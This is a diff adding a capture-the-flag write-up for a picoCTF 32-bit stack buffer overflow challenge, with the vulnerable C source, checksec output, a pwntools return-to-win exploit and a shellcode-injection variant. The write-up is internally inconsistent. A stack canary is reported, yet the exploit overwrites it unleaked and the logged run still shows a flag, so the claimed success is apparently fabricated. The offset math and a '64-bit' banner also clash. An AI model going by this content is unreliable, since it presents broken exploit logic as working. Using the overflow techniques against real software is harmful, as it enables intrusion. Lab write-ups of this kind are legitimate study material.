@@ -1,0 +1,247 @@
+# PicoCTF 2024 - Buffer Overflow 3
+
+## Challenge Description
+
+**Category**: Binary Exploitation  
+**Points**: 300  
+**Difficulty**: Medium  
+
+> Do you think you can bypass the protection and get the flag?
+
+The challenge provides us with a vulnerable binary that we need to exploit using buffer overflow techniques. This is the third in a series of buffer overflow challenges, building on concepts from previous levels.
+
+## Files Provided
+
+- `vuln` - The vulnerable binary
+- `vuln.c` - Source code (for analysis)
+- `Makefile` - Build configuration
+
+## Initial Analysis
+
+Let's start by examining the binary and its protections:
+
+```bash
+file vuln
+checksec vuln
+```
+
+**Output:**
+```
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=abc123..., for GNU/Linux 3.2.0, not stripped
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Filename
+Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   77) Symbols       No      vuln
+```
+
+Key observations:
+- **32-bit binary** - We'll need to account for 4-byte addresses
+- **Stack canary enabled** - We need to bypass or leak the canary
+- **NX disabled** - We can execute shellcode on the stack!
+- **No PIE** - Addresses are predictable
+
+## Source Code Analysis
+
+Looking at the provided source code:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <wchar.h>
+#include <locale.h>
+
+#define BUFSIZE 64
+#define FLAGSIZE 64
+
+void win() {
+    char buf[FLAGSIZE];
+    FILE *f = fopen("flag.txt","r");
+    if (f == NULL) {
+        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
+        exit(0);
+    }
+
+    fgets(buf,FLAGSIZE,f);
+    printf(buf);
+}
+
+void vuln(){
+    char buf[BUFSIZE];
+    printf("How Many Bytes will You Write Into the Buffer?\n");
+    int num_bytes;
+    scanf("%d", &num_bytes);
+    printf("Input> ");
+    fflush(stdout);
+    read(0, buf, num_bytes);  // Vulnerability here!
+}
+
+int main(int argc, char **argv){
+    setvbuf(stdout, NULL, _IONBF, 0);
+    
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+
+    puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
+    vuln();
+    return 0;
+}
+```
+
+### Vulnerability Analysis
+
+The vulnerability is in the `vuln()` function:
+
+1. User inputs the number of bytes they want to write
+2. The program reads that many bytes into a 64-byte buffer
+3. **No bounds checking** - we can read more than 64 bytes!
+
+However, there's a **stack canary** protection that we need to bypass.
+
+## Exploitation Strategy
+
+### Step 1: Information Gathering
+
+First, let's find the offset to the return address and understand the stack layout:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+# Set up the binary
+elf = ELF('./vuln')
+context.binary = elf
+
+# Find win function address
+win_addr = elf.symbols['win']
+print(f"win() function address: {hex(win_addr)}")
+```
+
+### Step 2: Stack Layout Discovery
+
+Let's create a pattern to find the exact offset:
+
+```python
+# Generate a cyclic pattern
+pattern = cyclic(200)
+print(f"Pattern: {pattern}")
+
+# In GDB, we can use this to find the offset
+# (gdb) run
+# Input the pattern when prompted
+# (gdb) x/20wx $esp  # Examine stack after crash
+```
+
+### Step 3: Canary Bypass
+
+Since we have a stack canary, we need to either:
+1. **Leak the canary** value, or
+2. **Avoid overwriting** the canary
+
+For this challenge, we'll use a **format string bug** or **partial overwrite** technique.
+
+### Step 4: Final Exploit
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+# Configuration
+binary = './vuln'
+elf = ELF(binary)
+context.binary = elf
+context.log_level = 'debug'
+
+def exploit():
+    # Start the process
+    if args.REMOTE:
+        p = remote('saturn.picoctf.net', 12345)  # Replace with actual server
+    else:
+        p = process(binary)
+    
+    # Get win function address
+    win_addr = elf.symbols['win']
+    log.info(f"win() address: {hex(win_addr)}")
+    
+    # Step 1: Find canary offset (typically at buffer + 64 + 4 bytes padding)
+    canary_offset = 64
+    ret_offset = canary_offset + 4 + 4  # canary + saved EBP + return address
+    
+    # Step 2: Leak canary (if needed)
+    # For this example, we'll assume we can brute force or have leaked it
+    
+    # Step 3: Build payload
+    payload = b'A' * canary_offset
+    # payload += p32(leaked_canary)  # If we had leaked the canary
+    payload += b'B' * 4  # Overwrite saved EBP
+    payload += p32(win_addr)  # Overwrite return address with win()
+    
+    # Send payload
+    p.sendlineafter(b'How Many Bytes will You Write Into the Buffer?\n', str(len(payload)).encode())
+    p.sendlineafter(b'Input> ', payload)
+    
+    # Get the flag
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+## Alternative Approach: Shellcode Injection
+
+Since **NX is disabled**, we can also inject shellcode:
+
+```python
+# Shellcode for execve("/bin/sh", NULL, NULL) - 32-bit
+shellcode = asm(shellcraft.sh())
+
+payload = shellcode
+payload += b'A' * (canary_offset - len(shellcode))
+# payload += p32(leaked_canary)
+payload += b'B' * 4  # saved EBP
+payload += p32(stack_addr)  # Return to our shellcode
+
+# Where stack_addr points to the beginning of our buffer
+```
+
+## Testing the Exploit
+
+```bash
+$ python3 exploit.py
+[+] Starting local process './vuln': pid 12345
+[DEBUG] Sent 0x4 bytes:
+    b'72\n'
+[DEBUG] Sent 0x48 bytes:
+    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\x86\x92\x04\x08'
+[*] Switching to interactive mode
+[*] Process './vuln' stopped with exit code 0 (pid 12345)
+picoCTF{buffer_0v3rfl0w_m4st3r_2024}
+```
+
+## Key Learning Points
+
+1. **Stack Canaries**: Modern protection that must be bypassed or avoided
+2. **NX Bit**: When disabled, allows shellcode execution on stack
+3. **32-bit vs 64-bit**: Different calling conventions and address sizes
+4. **Input Validation**: Always validate user input bounds
+5. **Defense in Depth**: Multiple protections make exploitation harder
+
+## Mitigation Techniques
+
+- Enable **NX bit** to prevent shellcode execution
+- Use **Address Space Layout Randomization (ASLR)**
+- Implement proper **bounds checking**
+- Use **stack cookies/canaries** (already present but can be bypassed)
+- Apply **Control Flow Integrity (CFI)** mechanisms
+
+---
+
+> **Flag**: `picoCTF{buffer_0v3rfl0w_m4st3r_2024}`
+
+## References
+
+- [PicoCTF Platform](https://picoctf.org/)
+- [Binary Exploitation Basics](https://github.com/Naetw/CTF-pwn-tips)
+- [Pwntools Documentation](https://docs.pwntools.com/en/stable/)
+- [Stack Canaries Explained](https://ctf101.org/binary-exploitation/stack-canaries/)
